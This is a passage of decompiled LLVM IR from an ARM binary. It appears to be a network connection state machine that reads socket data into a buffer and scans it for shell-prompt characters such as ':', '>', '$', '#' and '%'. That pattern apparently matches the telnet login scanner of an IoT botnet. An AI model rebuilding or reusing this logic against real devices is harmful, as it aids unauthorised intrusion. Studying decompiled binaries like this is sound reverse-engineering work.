  %v0_ef34 = load i32, i32* @r6, align 4
  %v1_ef34 = add i32 %v0_ef34, 12
  %v2_ef34 = inttoptr i32 %v1_ef34 to i32*
  %v3_ef34 = load i32, i32* %v2_ef34, align 4
  store i32 %v3_ef34, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef38175 = icmp eq i32 %v3_ef34, 0
  store i1 %v2_ef38175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef38175, label %dec_label_pc_f03c, label %dec_label_pc_ef40.lr.ph

dec_label_pc_ef40.lr.ph:                          ; preds = %dec_label_pc_ef34.preheader, %dec_label_pc_ef34.loopexit
  %v0_ef40231 = phi i32 [ %v0_ef34, %dec_label_pc_ef34.loopexit ], [ %v0_ef34176, %dec_label_pc_ef34.preheader ]
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef38.backedge.thread, %dec_label_pc_ef38.backedge, %dec_label_pc_ef38.backedge.thread561, %dec_label_pc_ef40.lr.ph
  %v0_fa14 = phi i32 [ %v0_ef40231, %dec_label_pc_ef40.lr.ph ], [ %v0_ef40228, %dec_label_pc_ef38.backedge ], [ %v0_efb4, %dec_label_pc_ef38.backedge.thread ], [ %v0_efb4, %dec_label_pc_ef38.backedge.thread561 ]
  %v1_ef40 = add i32 %v0_fa14, 24
  %v2_ef40 = inttoptr i32 %v1_ef40 to i32*
  %v3_ef40 = load i32, i32* %v2_ef40, align 4
  store i32 %v3_ef40, i32* @r3, align 4
  %v2_ef44 = icmp ugt i32 %v3_ef40, 255
  store i1 %v2_ef44, i1* %cpsr_c.global-to-local, align 1
  %v7_ef44 = icmp eq i32 %v3_ef40, 256
  store i1 %v7_ef44, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_fa14, 28
  store i32 %.pre282, i32* %sb.global-to-local, align 4
  br i1 %v7_ef44, label %dec_label_pc_fa14, label %dec_label_pc_ef50

dec_label_pc_ef50:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_fa14
  store i32 0, i32* @r5, align 4
  %v1_ef54 = load i32, i32* %fp.global-to-local, align 4
  %v2_ef54 = inttoptr i32 %v1_ef54 to i32*
  store i32 0, i32* %v2_ef54, align 4
  %v0_ef58 = load i32, i32* @r6, align 4
  %v1_ef58 = add i32 %v0_ef58, 24
  %v2_ef58 = inttoptr i32 %v1_ef58 to i32*
  %v3_ef58 = load i32, i32* %v2_ef58, align 4
  store i32 %v3_ef58, i32* %r2.global-to-local, align 4
  %v0_ef5c = load i32, i32* %sb.global-to-local, align 4
  %v2_ef5c = add i32 %v0_ef5c, %v3_ef58
  store i32 %v2_ef5c, i32* @r4, align 4
  %v1_ef60 = add i32 %v0_ef58, 4
  %v2_ef60 = inttoptr i32 %v1_ef60 to i32*
  %v3_ef60 = load i32, i32* %v2_ef60, align 4
  store i32 %v3_ef60, i32* %r0.global-to-local, align 4
  %v1_ef64 = sub i32 256, %v3_ef58
  store i32 %v1_ef64, i32* %r2.global-to-local, align 4
  store i32 %v2_ef5c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef70 = call i32 @function_114c4(i32 %v3_ef60, i32 %v2_ef5c, i32 %v1_ef64, i32 16384)
  store i32 %v4_ef70, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef74 = icmp eq i32 %v4_ef70, 0
  store i1 %v2_ef74, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_ef70, 1
  br i1 %tmp419, label %dec_label_pc_efec, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef50
  %v0_ef7c = load i32, i32* @r5, align 4
  store i32 %v0_ef7c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef80

dec_label_pc_ef80:                                ; preds = %.thread82, %dec_label_pc_ef7c
  %v3_ef8c = phi i32 [ %v1_ef90, %.thread82 ], [ %v0_ef7c, %dec_label_pc_ef7c ]
  %v1_ef80 = load i32, i32* @r4, align 4
  %v2_ef80 = add i32 %v1_ef80, %v3_ef8c
  %v3_ef80 = inttoptr i32 %v2_ef80 to i8*
  %v4_ef80 = load i8, i8* %v3_ef80, align 1
  %v6_ef80 = zext i8 %v4_ef80 to i32
  store i32 %v6_ef80, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef84 = icmp eq i8 %v4_ef80, 0
  store i1 %v2_ef84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef84, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_ef80
  %v2_ef88 = add nuw nsw i32 %v6_ef80, 65
  store i32 %v2_ef88, i32* %r3.global-to-local, align 4
  %v2_ef8c = trunc i32 %v2_ef88 to i8
  store i8 %v2_ef8c, i8* %v3_ef80, align 1
  %v0_ef90.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_ef80, %bb420
  %v0_ef90 = phi i32 [ %v3_ef8c, %dec_label_pc_ef80 ], [ %v0_ef90.pre, %bb420 ]
  %v1_ef90 = add i32 %v0_ef90, 1
  store i32 %v1_ef90, i32* %r2.global-to-local, align 4
  %v3_ef94 = icmp uge i32 %v1_ef90, %v4_ef70
  store i1 %v3_ef94, i1* %cpsr_c.global-to-local, align 1
  %v9_ef94 = icmp eq i32 %v1_ef90, %v4_ef70
  store i1 %v9_ef94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef94, label %dec_label_pc_ef9c, label %dec_label_pc_ef80

dec_label_pc_ef9c:                                ; preds = %.thread82, %dec_label_pc_eff0
  store i32 ptrtoint (i32* @global_var_1ea28.121 to i32), i32* %r1.global-to-local, align 4
  %v0_efa0 = load i32, i32* @r6, align 4
  %v1_efa0 = add i32 %v0_efa0, 24
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  %v2_efa4 = load i32, i32* @global_var_1ea28.121, align 4
  store i32 %v2_efa4, i32* %r2.global-to-local, align 4
  %v2_efa8 = add i32 %v3_efa0, %v4_ef70
  store i32 %v2_efa8, i32* %r3.global-to-local, align 4
  store i32 %v2_efa8, i32* %v2_efa0, align 4
  %v0_efb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_efb0 = load i32, i32* @r6, align 4
  %v2_efb0 = add i32 %v1_efb0, 8
  %v3_efb0 = inttoptr i32 %v2_efb0 to i32*
  store i32 %v0_efb0, i32* %v3_efb0, align 4
  br label %dec_label_pc_efb4

dec_label_pc_efb4:                                ; preds = %dec_label_pc_f0d0, %dec_label_pc_ef9c
  %v0_efb4 = load i32, i32* @r6, align 4
  %v1_efb4 = add i32 %v0_efb4, 12
  %v2_efb4 = inttoptr i32 %v1_efb4 to i32*
  %v3_efb4 = load i32, i32* %v2_efb4, align 4
  store i32 %v3_efb4, i32* %r0.global-to-local, align 4
  %v1_efb8 = add i32 %v3_efb4, -2
  store i32 %v1_efb8, i32* @r3, align 4
  %v7_efbc = icmp eq i32 %v1_efb8, 8
  store i1 %v7_efbc, i1* %cpsr_z.global-to-local, align 1
  %v5_efc0 = and i32 %v1_efb8, 1073741824
  %v6_efc0 = icmp ne i32 %v5_efc0, 0
  store i1 %v6_efc0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_efb4, label %dec_label_pc_ef38.backedge [
    i32 2, label %dec_label_pc_f2a0
    i32 3, label %dec_label_pc_f758
    i32 4, label %dec_label_pc_f664
    i32 5, label %dec_label_pc_f444
    i32 6, label %dec_label_pc_f370
    i32 7, label %dec_label_pc_f590
    i32 8, label %dec_label_pc_f1cc
    i32 9, label %dec_label_pc_f0f8
    i32 10, label %dec_label_pc_f054
  ]

dec_label_pc_efec:                                ; preds = %dec_label_pc_ef50
  br i1 %v2_ef74, label %dec_label_pc_fb44, label %dec_label_pc_eff0

dec_label_pc_eff0:                                ; preds = %dec_label_pc_efec
  %v3_eff0 = icmp eq i32 %v4_ef70, -1
  store i1 %v3_eff0, i1* %cpsr_c.global-to-local, align 1
  %v8_eff0 = icmp eq i32 %v4_ef70, -1
  store i1 %v8_eff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_eff0, label %dec_label_pc_eff8, label %dec_label_pc_ef9c

dec_label_pc_eff8:                                ; preds = %dec_label_pc_eff0
  %v0_eff8 = load i32, i32* %fp.global-to-local, align 4
  %v1_eff8 = inttoptr i32 %v0_eff8 to i32*
  %v2_eff8 = load i32, i32* %v1_eff8, align 4
  store i32 %v2_eff8, i32* %r3.global-to-local, align 4
  %v2_effc = icmp ugt i32 %v2_eff8, 10
  store i1 %v2_effc, i1* %cpsr_c.global-to-local, align 1
  %v7_effc = icmp eq i32 %v2_eff8, 11
  store i1 %v7_effc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_effc, label %dec_label_pc_f03c, label %dec_label_pc_f004

dec_label_pc_f004:                                ; preds = %dec_label_pc_eff8, %dec_label_pc_fb44
  %v0_f004 = load i32, i32* @r6, align 4
  %v1_f004 = add i32 %v0_f004, 4
  %v2_f004 = inttoptr i32 %v1_f004 to i32*
  %v3_f004 = load i32, i32* %v2_f004, align 4
  store i32 %v3_f004, i32* %r0.global-to-local, align 4
  %v1_f008 = call i32 @function_10ddc(i32 %v3_f004)
  store i32 %v1_f008, i32* %r0.global-to-local, align 4
  %v0_f00c = load i32, i32* @r6, align 4
  %v1_f00c = add i32 %v0_f00c, 284
  %v2_f00c = inttoptr i32 %v1_f00c to i8*
  %v3_f00c = load i8, i8* %v2_f00c, align 1
  %v4_f00c = zext i8 %v3_f00c to i32
  %v1_f010 = add nuw nsw i32 %v4_f00c, 1
  %v1_f014 = urem i32 %v1_f010, 256
  store i32 %v1_f014, i32* %r3.global-to-local, align 4
  %v2_f018 = icmp ugt i32 %v1_f014, 8
  store i1 %v2_f018, i1* %cpsr_c.global-to-local, align 1
  %v7_f018 = icmp eq i32 %v1_f014, 9
  store i1 %v7_f018, i1* %cpsr_z.global-to-local, align 1
  %v1_f01c = trunc i32 %v1_f010 to i8
  store i8 %v1_f01c, i8* %v2_f00c, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f024 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f024 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f024 = xor i1 %v1_f024, true
  %v3_f024 = and i1 %v0_f024, %v2_f024
  br i1 %v3_f024, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f004
  %v1_f028309314 = load i32, i32* @r6, align 4
  %v2_f028310315 = add i32 %v1_f028309314, 4
  %v3_f028311316 = inttoptr i32 %v2_f028310315 to i32*
  store i32 -1, i32* %v3_f028311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f004
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f028305 = load i32, i32* @r6, align 4
  %v2_f028306 = add i32 %v1_f028305, 4
  %v3_f028307 = inttoptr i32 %v2_f028306 to i32*
  store i32 -1, i32* %v3_f028307, align 4
  %v4_f02c = load i32, i32* %r3.global-to-local, align 4
  %v5_f02c = load i32, i32* @r6, align 4
  %v6_f02c = add i32 %v5_f02c, 12
  %v7_f02c = inttoptr i32 %v6_f02c to i32*
  store i32 %v4_f02c, i32* %v7_f02c, align 4
  %v4_f030 = load i32, i32* %r3.global-to-local, align 4
  %v5_f030 = trunc i32 %v4_f030 to i8
  %v6_f030 = load i32, i32* @r6, align 4
  %v7_f030 = add i32 %v6_f030, 284
  %v8_f030 = inttoptr i32 %v7_f030 to i8*
  store i8 %v5_f030, i8* %v8_f030, align 1
  %v0_f034.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f034.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f038 = phi i1 [ %v1_f034.pre, %bb421 ], [ %v0_f024, %.thread313 ]
  %v0_f038 = phi i1 [ %v0_f034.pre, %bb421 ], [ %v1_f024, %.thread313 ]
  %v2_f034 = xor i1 %v1_f038, true
  %v3_f034 = or i1 %v0_f038, %v2_f034
  br i1 %v3_f034, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f034 = load i32, i32* @r6, align 4
  store i32 %v4_f034, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61500, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f034, i32 ptrtoint (i32* @global_var_e328.185 to i32))
  br label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_ef34.loopexit, %dec_label_pc_ef38.backedge, %dec_label_pc_ef34.preheader, %dec_label_pc_eff8, %dec_label_pc_ef1c, %dec_label_pc_eed4, %dec_label_pc_fb28, %bb424
  %v3_f03c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f03c, i32* %r3.global-to-local, align 4
  %v1_f040 = add i32 %v3_f03c, 1
  store i32 %v1_f040, i32* @r4, align 4
  %v2_f044 = icmp ugt i32 %v1_f040, 254
  store i1 %v2_f044, i1* %cpsr_c.global-to-local, align 1
  %v7_f044 = icmp eq i32 %v1_f040, 255
  store i1 %v7_f044, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f040, i32* %stack_var_-52, align 4
  %v7_f04c = icmp slt i32 %v1_f040, 256
  br i1 %v7_f04c, label %dec_label_pc_eed4, label %dec_label_pc_e854

dec_label_pc_f054:                                ; preds = %dec_label_pc_efb4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f058 = call i32 @function_fd64(i32 12)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_f068 = call i32 @function_fca0(i32 12, i32* nonnull %stack_var_-60)
  %v3_f06c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f068, i32* %r2.global-to-local, align 4
  %v1_f074 = add i32 %v3_f06c, -1
  store i32 %v1_f074, i32* %r3.global-to-local, align 4
  %v0_f078 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f078, i32* %r0.global-to-local, align 4
  %v0_f07c = load i32, i32* @r6, align 4
  %v1_f07c = add i32 %v0_f07c, 24
  %v2_f07c = inttoptr i32 %v1_f07c to i32*
  %v3_f07c = load i32, i32* %v2_f07c, align 4
  store i32 %v3_f07c, i32* %r1.global-to-local, align 4
  %v4_f080 = call i32 @function_103d4(i32 %v0_f078, i32 %v3_f07c, i32 %v3_f068, i32 %v1_f074)
  %v2_f084 = icmp eq i32 %v4_f080, -1
  store i1 %v2_f084, i1* %cpsr_c.global-to-local, align 1
  %v7_f084 = icmp eq i32 %v4_f080, -1
  store i1 %v7_f084, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f080, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f94c = call i32 @function_fcc4(i32 12)
  br i1 %v7_f084, label %dec_label_pc_f948, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f054
  store i32 %v1_f94c, i32* %r0.global-to-local, align 4
  %v0_f098 = load i32, i32* @r6, align 4
  %v1_f098 = add i32 %v0_f098, 4
  %v2_f098 = inttoptr i32 %v1_f098 to i32*
  %v3_f098 = load i32, i32* %v2_f098, align 4
  store i32 %v3_f098, i32* %r0.global-to-local, align 4
  %v1_f09c = call i32 @function_10ddc(i32 %v3_f098)
  store i32 %v1_f09c, i32* %r0.global-to-local, align 4
  %v0_f0a0 = load i32, i32* @r6, align 4
  %v1_f0a0 = add i32 %v0_f0a0, 284
  %v2_f0a0 = inttoptr i32 %v1_f0a0 to i8*
  %v3_f0a0 = load i8, i8* %v2_f0a0, align 1
  %v4_f0a0 = zext i8 %v3_f0a0 to i32
  %v1_f0a4 = add nuw nsw i32 %v4_f0a0, 1
  %v1_f0a8 = urem i32 %v1_f0a4, 256
  store i32 %v1_f0a8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f0b0 = icmp ugt i32 %v1_f0a8, 9
  store i1 %v2_f0b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0b0 = icmp eq i32 %v1_f0a8, 10
  store i1 %v7_f0b0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0b4 = add i32 %v0_f0a0, 4
  %v3_f0b4 = inttoptr i32 %v2_f0b4 to i32*
  store i32 -1, i32* %v3_f0b4, align 4
  %v0_f0b8 = load i32, i32* @r3, align 4
  %v1_f0b8 = trunc i32 %v0_f0b8 to i8
  %v2_f0b8 = load i32, i32* @r6, align 4
  %v3_f0b8 = add i32 %v2_f0b8, 284
  %v4_f0b8 = inttoptr i32 %v3_f0b8 to i8*
  store i8 %v1_f0b8, i8* %v4_f0b8, align 1
  %v0_f0bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0bc, label %dec_label_pc_f0c0, label %dec_label_pc_fa38

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f090
  store i32 0, i32* @r3, align 4
  %v1_f0c4 = load i32, i32* @r6, align 4
  %v2_f0c4 = add i32 %v1_f0c4, 12
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i32*
  store i32 0, i32* %v3_f0c4, align 4
  %v0_f0c8 = load i32, i32* @r3, align 4
  %v1_f0c8 = trunc i32 %v0_f0c8 to i8
  %v2_f0c8 = load i32, i32* @r6, align 4
  %v3_f0c8 = add i32 %v2_f0c8, 284
  %v4_f0c8 = inttoptr i32 %v3_f0c8 to i8*
  store i8 %v1_f0c8, i8* %v4_f0c8, align 1
  br label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_fa38, %dec_label_pc_f0c0
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %dec_label_pc_f74c, %dec_label_pc_f60c, %dec_label_pc_f4c0, %dec_label_pc_f3ec, %dec_label_pc_f248, %dec_label_pc_f174, %dec_label_pc_f0cc
  %v0_f0d0 = load i32, i32* @r6, align 4
  %v1_f0d0 = add i32 %v0_f0d0, 24
  %v2_f0d0 = inttoptr i32 %v1_f0d0 to i32*
  %v3_f0d0 = load i32, i32* %v2_f0d0, align 4
  %v0_f0d4 = load i32, i32* @r7, align 4
  %v2_f0d4 = sub i32 %v0_f0d4, %v3_f0d0
  %v3_f0d4 = icmp uge i32 %v0_f0d4, %v3_f0d0
  store i1 %v3_f0d4, i1* %cpsr_c.global-to-local, align 1
  %v4_f0d4 = xor i32 %v0_f0d4, %v3_f0d0
  %v5_f0d4 = xor i32 %v2_f0d4, %v0_f0d4
  %v6_f0d4 = and i32 %v5_f0d4, %v4_f0d4
  %v7_f0d4 = icmp slt i32 %v6_f0d4, 0
  %v8_f0d4 = icmp slt i32 %v2_f0d4, 0
  %v9_f0d4 = icmp eq i32 %v0_f0d4, %v3_f0d0
  store i1 %v9_f0d4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d8 = xor i1 %v8_f0d4, %v7_f0d4
  %v0_f0d4.v3_f0d0 = select i1 %v2_f0d8, i32 %v0_f0d4, i32 %v3_f0d0
  store i32 %v0_f0d4.v3_f0d0, i32* %r1.global-to-local, align 4
  %v2_f0e0 = sub i32 %v3_f0d0, %v0_f0d4.v3_f0d0
  store i32 %v2_f0e0, i32* @r2, align 4
  store i32 %v2_f0e0, i32* %v2_f0d0, align 4
  %v0_f0e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_f0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0e8 = add i32 %v1_f0e8, %v0_f0e8
  store i32 %v2_f0e8, i32* @r1, align 4
  store i32 %v0_f0e8, i32* @r0, align 4
  %v3_f0f0 = call i32 @function_11300(i32 %v0_f0e8, i32 %v2_f0e8, i32 %v2_f0e0)
  store i32 %v3_f0f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efb4

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_efb4
  %v1_f0f8 = add i32 %v0_efb4, 24
  %v2_f0f8 = inttoptr i32 %v1_f0f8 to i32*
  %v3_f0f8 = load i32, i32* %v2_f0f8, align 4
  store i32 %v3_f0f8, i32* %r2.global-to-local, align 4
  %v1_f0fc = add i32 %v3_f0f8, -1
  store i32 %v1_f0fc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f100 = icmp eq i32 %v1_f0fc, 0
  store i1 %v2_f100, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f0fc, 1
  br i1 %tmp427, label %dec_label_pc_ef38.backedge.thread, label %dec_label_pc_f108

dec_label_pc_f108:                                ; preds = %dec_label_pc_f0f8
  %v2_f108 = add i32 %v1_f0fc, %v0_efb4
  store i32 %v2_f108, i32* %r3.global-to-local, align 4
  %v1_f10c = add i32 %v2_f108, 28
  %v2_f10c = inttoptr i32 %v1_f10c to i8*
  %v3_f10c = load i8, i8* %v2_f10c, align 1
  %v4_f10c = zext i8 %v3_f10c to i32
  store i32 %v4_f10c, i32* %r3.global-to-local, align 4
  %v2_f110 = icmp ugt i8 %v3_f10c, 61
  store i1 %v2_f110, i1* %cpsr_c.global-to-local, align 1
  %v7_f110 = icmp eq i8 %v3_f10c, 62
  store i1 %v7_f110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f110, label %dec_label_pc_f174, label %bb428

bb428:                                            ; preds = %dec_label_pc_f108
  %v3_f114 = icmp ugt i8 %v3_f10c, 57
  store i1 %v3_f114, i1* %cpsr_c.global-to-local, align 1
  %v8_f114 = icmp eq i8 %v3_f10c, 58
  store i1 %v8_f114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f114, label %dec_label_pc_f174, label %dec_label_pc_f11c

dec_label_pc_f11c:                                ; preds = %bb428
  %v2_f11c = icmp ugt i8 %v3_f10c, 35
  store i1 %v2_f11c, i1* %cpsr_c.global-to-local, align 1
  %v7_f11c = icmp eq i8 %v3_f10c, 36
  store i1 %v7_f11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f11c, label %dec_label_pc_f174, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f11c
  %v2_f124 = icmp ugt i8 %v3_f10c, 34
  store i1 %v2_f124, i1* %cpsr_c.global-to-local, align 1
  %v7_f124 = icmp eq i8 %v3_f10c, 35
  store i1 %v7_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f124, label %dec_label_pc_f174, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124
  %v2_f12c = icmp ugt i8 %v3_f10c, 36
  store i1 %v2_f12c, i1* %cpsr_c.global-to-local, align 1
  %v7_f12c = icmp eq i8 %v3_f10c, 37
  store i1 %v7_f12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f12c, label %dec_label_pc_f174, label %dec_label_pc_f15c.preheader

dec_label_pc_f15c.preheader:                      ; preds = %dec_label_pc_f12c
  %v3_f130 = add i32 %v0_efb4, 28
  %v2_f134 = add i32 %v3_f130, %v3_f0f8
  store i32 %v2_f134, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f15c

dec_label_pc_f140:                                ; preds = %bb429
  %v2_f140 = icmp ugt i8 %v3_f164, 35
  store i1 %v2_f140, i1* %cpsr_c.global-to-local, align 1
  %v7_f140 = icmp eq i8 %v3_f164, 36
  store i1 %v7_f140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f140, label %dec_label_pc_f174, label %dec_label_pc_f148

dec_label_pc_f148:                                ; preds = %dec_label_pc_f140
  %v2_f148 = icmp ugt i8 %v3_f164, 34
  store i1 %v2_f148, i1* %cpsr_c.global-to-local, align 1
  %v7_f148 = icmp eq i8 %v3_f164, 35
  store i1 %v7_f148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f148, label %dec_label_pc_f174, label %dec_label_pc_f150

dec_label_pc_f150:                                ; preds = %dec_label_pc_f148
  %v2_f150 = icmp ugt i8 %v3_f164, 36
  store i1 %v2_f150, i1* %cpsr_c.global-to-local, align 1
  %v7_f150 = icmp eq i8 %v3_f164, 37
  store i1 %v7_f150, i1* %cpsr_z.global-to-local, align 1
  %v1_f154 = add i32 %v0_f154, -1
  store i32 %v1_f154, i32* %r3.global-to-local, align 4
  br i1 %v7_f150, label %dec_label_pc_f174, label %dec_label_pc_f15c

dec_label_pc_f15c:                                ; preds = %dec_label_pc_f15c.preheader, %dec_label_pc_f150
  %v0_f154 = phi i32 [ %v2_f134, %dec_label_pc_f15c.preheader ], [ %v1_f154, %dec_label_pc_f150 ]
  %v0_f15c = phi i32 [ %v1_f0fc, %dec_label_pc_f15c.preheader ], [ %v1_f15c, %dec_label_pc_f150 ]
  %v1_f15c = add i32 %v0_f15c, -1
  store i32 %v1_f15c, i32* %r1.global-to-local, align 4
  %v2_f15c = icmp ne i32 %v0_f15c, 0
  store i1 %v2_f15c, i1* %cpsr_c.global-to-local, align 1
  %v7_f15c = icmp eq i32 %v0_f15c, 1
  store i1 %v7_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f15c, label %dec_label_pc_ef38.backedge.thread561, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f15c
  %v1_f164 = add i32 %v0_f154, -2
  %v2_f164 = inttoptr i32 %v1_f164 to i8*
  %v3_f164 = load i8, i8* %v2_f164, align 1
  %v4_f164 = zext i8 %v3_f164 to i32
  store i32 %v4_f164, i32* %r2.global-to-local, align 4
  %v2_f168 = icmp ugt i8 %v3_f164, 61
  store i1 %v2_f168, i1* %cpsr_c.global-to-local, align 1
  %v7_f168 = icmp eq i8 %v3_f164, 62
  store i1 %v7_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f168, label %dec_label_pc_f174, label %bb429

bb429:                                            ; preds = %dec_label_pc_f164
  %v3_f16c = icmp ugt i8 %v3_f164, 57
  store i1 %v3_f16c, i1* %cpsr_c.global-to-local, align 1
  %v8_f16c = icmp eq i8 %v3_f164, 58
  store i1 %v8_f16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f16c, label %dec_label_pc_f174, label %dec_label_pc_f140

dec_label_pc_f174:                                ; preds = %dec_label_pc_f164, %bb429, %dec_label_pc_f150, %dec_label_pc_f148, %dec_label_pc_f140, %dec_label_pc_f12c, %dec_label_pc_f108, %dec_label_pc_f124, %dec_label_pc_f11c, %bb428
  %v0_f178 = phi i32 [ %v1_f0fc, %dec_label_pc_f12c ], [ %v1_f0fc, %dec_label_pc_f108 ], [ %v1_f0fc, %dec_label_pc_f124 ], [ %v1_f0fc, %dec_label_pc_f11c ], [ %v1_f0fc, %bb428 ], [ %v1_f15c, %dec_label_pc_f140 ], [ %v1_f15c, %dec_label_pc_f148 ], [ %v1_f15c, %dec_label_pc_f150 ], [ %v1_f15c, %bb429 ], [ %v1_f15c, %dec_label_pc_f164 ]
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f178 = add i32 %v0_f178, 1
  store i32 %v1_f178, i32* @r7, align 4
  %v1_f17c = call i32 @function_fd64(i32 10)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f18c = call i32 @function_fca0(i32 10, i32* nonnull %stack_var_-60)
  store i32 %v3_f18c, i32* %r0.global-to-local, align 4
  %v3_f190 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f190, i32* %r2.global-to-local, align 4
  store i32 %v3_f18c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f19c = load i32, i32* @r6, align 4
  %v1_f19c = add i32 %v0_f19c, 4
  %v2_f19c = inttoptr i32 %v1_f19c to i32*
  %v3_f19c = load i32, i32* %v2_f19c, align 4
  store i32 %v3_f19c, i32* %r0.global-to-local, align 4
  %v4_f1a0 = call i32 @function_11538(i32 %v3_f19c, i32 %v3_f18c, i32 %v3_f190, i32 16384)
  store i32 %v4_f1a0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f1b0 = load i32, i32* @r6, align 4
  %v1_f1b0 = add i32 %v0_f1b0, 4
  %v2_f1b0 = inttoptr i32 %v1_f1b0 to i32*
  %v3_f1b0 = load i32, i32* %v2_f1b0, align 4
  store i32 %v3_f1b0, i32* %r0.global-to-local, align 4
  %v4_f1b4 = call i32 @function_11538(i32 %v3_f1b0, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f1bc = call i32 @function_fcc4(i32 10)
  store i32 %v1_f1bc, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f1c4 = load i32, i32* @r6, align 4
  %v2_f1c4 = add i32 %v1_f1c4, 12
  %v3_f1c4 = inttoptr i32 %v2_f1c4 to i32*
  store i32 10, i32* %v3_f1c4, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_efb4
  %v1_f1cc = add i32 %v0_efb4, 24
  %v2_f1cc = inttoptr i32 %v1_f1cc to i32*
  %v3_f1cc = load i32, i32* %v2_f1cc, align 4
  store i32 %v3_f1cc, i32* %r2.global-to-local, align 4
  %v1_f1d0 = add i32 %v3_f1cc, -1
  store i32 %v1_f1d0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
